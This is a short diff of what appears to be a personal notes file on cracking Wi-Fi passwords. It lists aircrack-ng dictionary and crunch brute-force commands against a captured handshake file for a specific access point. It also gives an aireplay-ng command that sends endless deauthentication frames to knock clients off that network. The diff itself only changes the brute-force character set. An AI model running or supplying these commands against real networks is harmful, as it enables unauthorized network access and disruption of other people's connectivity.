@@ -14,7 +14,7 @@ after crack hack1-01.cap file by dictionery attack
 aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
 
 after crack hack1-01.cap file by brute force attack
-crunch  6 12 sachin12345 | aircrack-ng hack1-01.cap -b A6:4A:D5:A5:58:B4 -w-
+crunch  6 12 abcdef12345 | aircrack-ng hack1-01.cap -b A6:4A:D5:A5:58:B4 -w-
 
 Second Terminal 
 aireplay-ng --deauth 0 -a A6:4A:D5:A5:58:B4 wlan0 
